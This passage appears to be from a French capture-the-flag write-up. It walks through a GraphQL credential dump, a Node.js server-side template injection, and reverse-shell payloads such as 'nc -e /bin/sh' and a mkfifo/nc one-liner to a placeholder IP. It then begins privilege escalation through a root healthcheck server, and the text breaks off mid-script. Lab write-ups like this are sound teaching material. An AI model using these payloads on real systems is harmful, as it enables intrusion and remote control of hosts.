+</ul>
+<p>Étant un partisan du moindre effort, je choisis la seconde option. Et pour ce faire, il &ldquo;suffit&rdquo; de rajouter un <strong>s</strong> à la fin du nom de table.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="line"><span class="cl"><span class="p">{</span><span class="w"> </span><span class="py">users</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="py">username</span><span class="p">,</span><span class="w"> </span><span class="py">password</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On obtient bien la liste de tous les couples <em>username</em>/<em>password</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="line"><span class="cl"><span class="p">{</span><span class="s">&#34;users&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;michelle&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;Michelle1234&amp;__&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;bernard&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;youki1963&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;administrateur&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;ENSIBS{WOW_Such_Big_Credentials}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On a donc notre premier flag, et de quoi se connecter avec le compte administrateur.</p>
+<h2 class="heading-element" id="obtenir-un-shell"><span>Obtenir un shell</span>
+  <a href="#obtenir-un-shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Une fois connecté, on ne me laisse pas trop le choix&hellip; On a juste une page pour créer des blogpost.</p>
+<p><img loading="lazy" src='/img/Nuclea_connected.png' alt="Page pour créer les blogpost"></p>
+<p>Ils sont gentils, ils m&rsquo;indiquent tout de suite où regarder : Une &ldquo;Server Side Template Injection&rdquo;.</p>
+<p>Je teste comme ils disent le fameux <strong>{7*7}</strong> et en allant voir dans les blogpost, je vois bien mon post avec en contenu <strong>49</strong>.</p>
+<p>Pour être honnête, je ne connais que les injections de template via jinja, mon premier reflexe est donc de tenter une injection de code python.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">92</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;id -a&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="p">}}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Mais étrangement le bouton ajouter ne fonctionne pas&hellip;</p>
+<p>Dans un premier temps j&rsquo;ai pensé à un genre de WAF qui bloquerait des mots-clefs, puis j&rsquo;ai décidé de regarder le code source de la page. On pouvait y voir un code javascript qui gère l&rsquo;envoi de la requête et l&rsquo;affichage de sa réponse.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#submit&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="kd">var</span> <span class="nx">settings</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;async&#34;</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;url&#34;</span><span class="o">:</span> <span class="s2">&#34;/admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;method&#34;</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;headers&#34;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="s2">&#34;content-type&#34;</span><span class="o">:</span> <span class="s2">&#34;application/json&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;processData&#34;</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;data&#34;</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">              <span class="nx">title</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">              <span class="nx">content</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="p">})</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="c1">// Send data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="nx">settings</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">response</span> <span class="o">===</span> <span class="kc">true</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">              <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Succesfully added blogpost&#39;</span><span class="p">)</span>             
+</span></span><span class="line"><span class="cl">              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Something went bad ...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">      <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Étrangement, on ne rentrait même pas dans le <em>else</em> du test après l&rsquo;envoi de la requête. C&rsquo;était donc une erreur non prévue par le serveur&hellip; L&rsquo;injection de template n&rsquo;était donc probablement pas en python.</p>
+<p>On essaie d&rsquo;injecter des mots clefs de langages, comme du node.js.</p>
+<p>En envoyant un <strong>{ this }</strong>, le blogpost se créé, on va donc voir son contenu.</p>
+<p><img loading="lazy" src='/img/Nuclea_injected_post.png' alt="Blogpost avec injection"></p>
+<p>Bingo, c&rsquo;est du node.js !</p>
+<p>Je sais qu&rsquo;on peut exécuter des commandes système avec le code suivant.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;&lt;CMD&gt;&#39;</span><span class="p">)</span> <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Mais à chaque fois j&rsquo;obtient le résultat <strong>[object Object]</strong>.</p>
+<p>J&rsquo;arrête donc d&rsquo;essayer d&rsquo;afficher et je lance un reverse shell. Sur ma machine j&rsquo;ouvre un listener.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">51337</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et je test une première payload sur le serveur.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh &lt;IP&gt; &lt;PORT&gt;&#39;</span><span class="p">))</span> <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Malheureusement, ça ne fonctionne pas. Il n&rsquo;y a probablement pas la bonne version de netcat pour ça. Mais pas d&rsquo;inquiétude, on utilise une autre payload qui fonctionne à (presque) tous les coups :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;</span><span class="p">))</span> <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et on obtient bien un accès sur notre listener.</p>
+<p>Je fais ensuite en sorte d&rsquo;avoir un shell totalement interactif.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	&lt;Ctrl+Z&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">stty -a <span class="p">|</span> head -n1 <span class="c1">#Je lis les valeurs rows &amp; columns</span>
+</span></span><span class="line"><span class="cl">stty raw -echo
+</span></span><span class="line"><span class="cl"><span class="nb">fg</span> <span class="c1">#Il faut faire plusieures fois entrée</span>
+</span></span><span class="line"><span class="cl">stty rows X columns Y <span class="c1">#Avec X et Y les valeurs lues plus haut</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Puis on va lire le flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> 
+</span></span><span class="line"><span class="cl">cat flag
+</span></span><span class="line"><span class="cl">	ENSIBS<span class="o">{</span>Web-ServerUserFlagHereBroooo<span class="o">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Parfait, passons à l&rsquo;étape 3.</p>
+<h2 class="heading-element" id="obtenir-un-shell-root"><span>Obtenir un shell root</span>
+  <a href="#obtenir-un-shell-root" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Déjà, le premier reflexe est de voir ce qu&rsquo;on peut executer avec sudo.</p>
+<p><img loading="lazy" src='/img/Nuclea_sudo.jpg' alt="Retour de sudo -l"></p>
+<p>Le sudo nous permet de lancer un serveur node.js en tant que root. En regardant les processus, on voit que ce serveur tourne déjà. On va dans un premier temps regarder le code de ce dernier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span>  <span class="nx">express_basic_auth</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-basic-auth&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">config</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">PORT</span> <span class="o">:</span> <span class="mi">3000</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">check_credentials</span> <span class="o">=</span> <span class="p">(</span><span class="nx">user</span><span class="p">,</span><span class="nx">password</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">process</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,[</span><span class="s1">&#39;/healthcheck/authent.sh&#39;</span><span class="p">,</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">password</span> <span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">String</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;True&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">basic_auth</span> <span class="o">=</span> <span class="nx">express_basic_auth</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">authorizer</span> <span class="o">:</span> <span class="nx">check_credentials</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unauthorizedResponse</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">req</span><span class="p">.</span><span class="nx">auth</span>
+</span></span><span class="line"><span class="cl">        <span class="o">?</span> <span class="p">(</span><span class="s1">&#39;Credentials &#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">auth</span><span class="p">.</span><span class="nx">user</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="s2">&#34;**********&#34;</span> <span class="o">+</span> <span class="s1">&#39; rejected&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s1">&#39;No credentials provided&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">basic_auth</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/ping&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;up&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/health&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/ps&#39;</span><span class="p">,[</span><span class="s1">&#39;-auxfw&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/disk-usage&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/df&#39;</span><span class="p">,[</span><span class="s1">&#39;-h&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/web-logs&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">,[</span><span class="s1">&#39;/var/log/httpd/error_log&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/active-connections&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/netstat&#39;</span><span class="p">,[</span><span class="s1">&#39;-laputen&#39;</span><span class="p">]).</span><span class="nx">stdout</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Healthcheck app listening on port </span><span class="si">${</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">!`</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Il s&rsquo;agit d&rsquo;un healthcheck sur le port 3000 avec authentification via basic-auth. On n&rsquo;a pas les droits pour modifier ces fichiers donc la seule piste actuelle serait d&rsquo;effectuer une injection via ce que fait le serveur.</p>
+<p>En s&rsquo;intéressant un peu plus à la fonction <strong>check_credentials</strong>, on voit qu&rsquo;il appelle un script shell avec en argument le couple login/password avec lequel on veut s&rsquo;authentifier. On va donc regarder ça de plus près.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">PATH</span><span class="o">=</span>/bin:/usr/bin
+</span></span><span class="line"><span class="cl">
